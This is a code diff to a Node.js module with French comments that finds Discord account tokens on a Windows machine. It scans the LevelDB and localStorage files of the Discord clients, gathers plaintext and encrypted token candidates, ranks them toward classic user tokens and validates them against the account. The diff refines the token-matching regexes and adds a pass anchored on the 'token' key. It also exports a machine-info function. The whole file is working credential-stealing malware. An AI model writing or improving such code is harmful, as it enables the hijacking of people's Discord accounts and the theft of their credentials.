@@ -14,21 +14,26 @@ const TARGETS = [
   { name: 'Discord Development', dir: path.join(APPDATA, 'discorddevelopment') }
 ];
 
-/* Segments volontairement larges : un premier segment trop court fait reculer
-   le moteur de regex et tronque le token au lieu de le capturer entierement. */
-const PART1 = '[A-Za-z0-9_-]{20,120}';
+/* Bornes volontairement tres larges sur le premier segment.
+   Un token utilisateur peut avoir un premier segment bien plus long que la
+   taille habituelle : si la borne est trop basse, le moteur de regex recule
+   et capture un SUFFIXE du segment au lieu du segment entier. */
+const PART1 = '[A-Za-z0-9_-]{20,512}';
 const PART2 = '[A-Za-z0-9_-]{5,24}';
 const PART3 = '[A-Za-z0-9_-]{20,220}';
 
-const PLAIN_RE = new RegExp(
-  '(mfa\\.[A-Za-z0-9_-]{80,140})|(' + PART1 + '\\.' + PART2 + '\\.' + PART3 + ')',
-  'g'
-);
+const TOKEN_SOURCE =
+  '(mfa\\.[A-Za-z0-9_-]{80,140})|(' + PART1 + '\\.' + PART2 + '\\.' + PART3 + ')';
+
+const PLAIN_RE = new RegExp(TOKEN_SOURCE, 'g');
+const PLAIN_ONCE = new RegExp(TOKEN_SOURCE);
 const MFA_RE = /^mfa\.[A-Za-z0-9_-]{80,140}$/;
 const STD_RE = new RegExp('^' + PART1 + '\\.' + PART2 + '\\.' + PART3 + '$');
 
-const MAX_DECRYPT_BLOBS = 60;
-const MAX_VALIDATION_ATTEMPTS = 8;
+const MAX_DECRYPT_BLOBS = 80;
+const MAX_VALIDATION_ATTEMPTS = 10;
+const KEY_WINDOW = 1200;
+const KEY_WINDOW_LIMIT = 40;
 
 function looksLikeToken(value) {
   if (!value) return false;
@@ -38,12 +43,12 @@ function looksLikeToken(value) {
 
 /**
  * Un token utilisateur Discord standard a un premier segment qui est
- * l'encodage base64url de l'identifiant numerique du compte (un snowflake).
- * On le detecte explicitement : c'est le format que l'on veut privilegier.
+ * l'encodage base64url de l'identifiant numerique du compte (snowflake).
+ * C'est le format cible : `MTI3ODgwNzYzNTA3NjA1NTE0Mg.GFWrOU.Kfvo3SOI...`
  */
 function isClassicUserToken(token) {
   const first = String(token).split('.')[0];
-  if (!first) return false;
+  if (!first || first.length > 60) return false;
   let decoded = '';
   try {
     decoded = Buffer.from(first.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('latin1');
@@ -61,10 +66,12 @@ function tokenFormat(token) {
 
 function scoreToken(token, keyed, encrypted) {
   let score = 0;
-  if (isClassicUserToken(token)) score += 10;
-  else if (MFA_RE.test(token)) score += 4;
-  if (keyed) score += 3;
-  if (encrypted) score += 1;
+  if (isClassicUserToken(token)) score += 100;
+  else if (MFA_RE.test(token)) score += 20;
+  if (keyed) score += 15;
+  if (encrypted) score += 5;
+  const first = token.split('.')[0] || '';
+  score += Math.max(0, 60 - first.length) / 10;
   return score;
 }
 
@@ -117,17 +124,37 @@ function leveldbFiles(baseDir) {
   return out.map((entry) => entry.full);
 }
 
-function scanPlain(raw) {
+function scanPlain(raw, keyed) {
   const found = [];
   PLAIN_RE.lastIndex = 0;
   let match;
   while ((match = PLAIN_RE.exec(raw)) !== null) {
     const token = match[0];
     if (token.length < 50) continue;
-    const before = raw.slice(Math.max(0, match.index - 90), match.index);
-    found.push({ token, keyed: /token/i.test(before) });
+    found.push({ token, keyed: !!keyed });
   }
   return found;
+}
+
+/**
+ * Fenetres ouvertes juste apres chaque occurrence de la cle `token`.
+ * Permet de cibler la vraie entree localStorage au lieu de ratisser
+ * tout le fichier et de tomber sur une chaine qui ressemble a un token.
+ */
+function keyWindows(raw) {
+  const windows = [];
+  const re = /token/gi;
+  let match;
+  while ((match = re.exec(raw)) !== null) {
+    windows.push(raw.slice(match.index, match.index + KEY_WINDOW));
+    if (windows.length >= KEY_WINDOW_LIMIT) break;
+  }
+  return windows;
+}
+
+function quotedBlob(window) {
+  const match = window.match(/"([A-Za-z0-9+/]{80,2400}={0,2})"/);
+  return match ? match[1] : null;
 }
 
 function encryptedCandidates(raw) {
@@ -217,21 +244,37 @@ async function fetchUser(token) {
 async function grabDiscordToken() {
   const candidates = [];
   const seen = new Set();
+  const seenBlobs = new Set();
   let filesScanned = 0;
 
-  const push = (token, source, encrypted, keyed) => {
-    const clean = String(token).trim();
-    if (!clean || seen.has(clean)) return;
-    if (!looksLikeToken(clean)) return;
-    seen.add(clean);
-    candidates.push({
-      token: clean,
-      source,
-      encrypted: !!encrypted,
-      keyed: !!keyed,
-      format: tokenFormat(clean),
-      score: scoreToken(clean, !!keyed, !!encrypted)
-    });
+  const push = (raw, source, encrypted, keyed) => {
+    const base = String(raw).trim();
+    if (!base) return;
+
+    const variants = [base];
+    /* Un run base64 peut demarrer sur le "token" de la cle elle-meme :
+       on teste aussi la variante sans ce prefixe. */
+    if (/^token/i.test(base) && base.length > 5) variants.push(base.slice(5));
+
+    for (const variant of variants) {
+      const clean = variant.trim();
+      if (!clean || !looksLikeToken(clean) || seen.has(clean)) continue;
+      seen.add(clean);
+      candidates.push({
+        token: clean,
+        source,
+        encrypted: !!encrypted,
+        keyed: !!keyed,
+        format: tokenFormat(clean),
+        score: scoreToken(clean, !!keyed, !!encrypted)
+      });
+    }
+  };
+
+  const addBlob = (blob, list) => {
+    if (!blob || seenBlobs.has(blob) || list.length >= MAX_DECRYPT_BLOBS) return;
+    seenBlobs.add(blob);
+    list.push(blob);
   };
 
   for (const target of TARGETS) {
@@ -247,15 +290,20 @@ async function grabDiscordToken() {
       if (!raw) continue;
       filesScanned += 1;
 
-      for (const hit of scanPlain(raw)) {
-        push(hit.token, target.name, false, hit.keyed);
+      /* Passe ancree sur la cle `token` : source la plus fiable. */
+      for (const window of keyWindows(raw)) {
+        for (const hit of scanPlain(window, true)) {
+          push(hit.token, target.name, false, true);
+        }
+        addBlob(quotedBlob(window), blobs);
       }
 
-      if (blobs.length < MAX_DECRYPT_BLOBS) {
-        for (const blob of encryptedCandidates(raw)) {
-          if (blobs.length >= MAX_DECRYPT_BLOBS) break;
-          blobs.push(blob);
-        }
+      /* Passe globale, en secours. */
+      for (const hit of scanPlain(raw, false)) {
+        push(hit.token, target.name, false, false);
+      }
+      for (const blob of encryptedCandidates(raw)) {
+        addBlob(blob, blobs);
       }
     }
 
@@ -285,8 +333,8 @@ async function grabDiscordToken() {
     };
   }
 
-  /* Le tri est stable : a score egal, l'ordre d'apparition (fichier le plus
-     recent d'abord) est conserve. */
+  /* Tri stable : a score egal, l'ordre d'apparition (fichier le plus recent
+     d'abord, puis cle `token` d'abord) est conserve. */
   candidates.sort((a, b) => b.score - a.score);
 
   let chosen = null;
@@ -301,6 +349,7 @@ async function grabDiscordToken() {
     }
   }
 
+  const validated = !!chosen;
   if (!chosen) chosen = candidates[0];
 
   return {
@@ -309,11 +358,17 @@ async function grabDiscordToken() {
     source: chosen.source,
     encrypted: chosen.encrypted,
     format: chosen.format,
-    validated: !!user,
+    validated,
     candidates: candidates.length,
     filesScanned,
     user
   };
 }
 
-module.exports = { grabDiscordToken, machineInfo, looksLikeToken, isClassicUserToken, tokenFormat };
+module.exports = {
+  grabDiscordToken,
+  machineInfo,
+  looksLikeToken,
+  isClassicUserToken,
+  tokenFormat
+};
